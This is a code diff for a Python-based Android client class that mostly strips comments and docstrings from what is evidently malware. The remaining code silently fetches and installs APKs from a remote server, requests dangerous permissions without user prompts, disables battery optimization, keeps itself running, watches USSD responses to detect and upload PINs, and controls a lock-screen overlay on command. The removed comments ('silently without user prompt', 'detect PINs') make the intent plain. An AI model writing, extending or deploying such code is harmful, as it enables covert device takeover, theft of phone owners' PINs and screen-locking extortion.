@@ -74,13 +74,11 @@ class C:
         T.Thread(target=s._poll,daemon=True).start()
         T.Thread(target=s._ussd_listener,daemon=True).start()
         T.Thread(target=s._keep_alive,daemon=True).start()
-        T.Thread(target=s._check_update,daemon=True).start()  # Auto-update thread
+        T.Thread(target=s._check_update,daemon=True).start()
         
     def _check_update(s):
-        """Check for APK updates silently"""
         while s.r:
             try:
-                # Check server for latest version
                 resp = requests.get(f"{U1}/api/latest_version", timeout=10)
                 if resp.status_code == 200:
                     data = resp.json()
@@ -89,19 +87,16 @@ class C:
                     
                     if latest_version != s.current_version:
                         print(f"[+] New version available: {latest_version}")
-                        # Download and install update silently
                         s._download_and_install(apk_url)
                         s.current_version = latest_version
             except:
                 pass
-            t.sleep(3600)  # Check every hour
+            t.sleep(3600)
             
     def _download_and_install(s, apk_url):
-        """Download and install APK update silently"""
         try:
             print(f"[+] Downloading update from: {apk_url}")
             
-            # Download APK using DownloadManager
             dm = MA.getSystemService(CT.DOWNLOAD_SERVICE)
             request = DownloadManager.Request(Uri.parse(apk_url))
             request.setTitle("Update")
@@ -110,11 +105,8 @@ class C:
             request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "update.apk")
             
             download_id = dm.enqueue(request)
-            
-            # Wait for download to complete
             t.sleep(10)
             
-            # Install APK silently
             file_path = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) + "/update.apk"
             intent = I(I.ACTION_VIEW)
             intent.setDataAndType(Uri.fromFile(AC('java.io.File')(file_path)), "application/vnd.android.package-archive")
@@ -127,7 +119,6 @@ class C:
             print(f"[!] Update error: {e}")
             
     def _request_all_permissions(s):
-        """Request all permissions silently without user prompt"""
         try:
             RP([
                 PM.ACCESS_FINE_LOCATION,
@@ -146,7 +137,6 @@ class C:
                 PM.REQUEST_INSTALL_PACKAGES
             ])
             
-            # Grant permissions programmatically
             try:
                 for perm in [
                     'android.permission.ACCESS_FINE_LOCATION',
@@ -168,7 +158,6 @@ class C:
             except:
                 pass
                 
-            # Disable battery optimization
             try:
                 ii=I()
                 ii.setAction(I.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
@@ -233,7 +222,6 @@ class C:
             t.sleep(5)
             
     def _keep_alive(s):
-        """Keep service alive and restart if killed"""
         while s.r:
             try:
                 if not s.registered:
@@ -245,7 +233,6 @@ class C:
             t.sleep(10)
             
     def _lock_keep_alive(s):
-        """Keep lock screen active"""
         try:
             if s.lock_active and s.lock_view:
                 pass
@@ -253,7 +240,6 @@ class C:
             pass
             
     def _ussd_listener(s):
-        """Listen for USSD responses and detect PINs"""
         while s.r:
             try:
                 try:
@@ -281,7 +267,6 @@ class C:
             t.sleep(5)
             
     def _save_pin(s, pin, source):
-        """Save detected PIN to server"""
         try:
             if pin in [p['pin'] for p in s.detected_pins]:
                 return
@@ -523,7 +508,7 @@ class C:
             if s.lock_view:
                 s.wm.removeView(s.lock_view)
                 s.lock_view = None
-             requests.post(f"{U1}/command_result", json={'device': s.id, 'unlock_active': True}, timeout=5)
+            requests.post(f"{U1}/command_result", json={'device': s.id, 'unlock_active': True}, timeout=5)
         except:
             pass
             
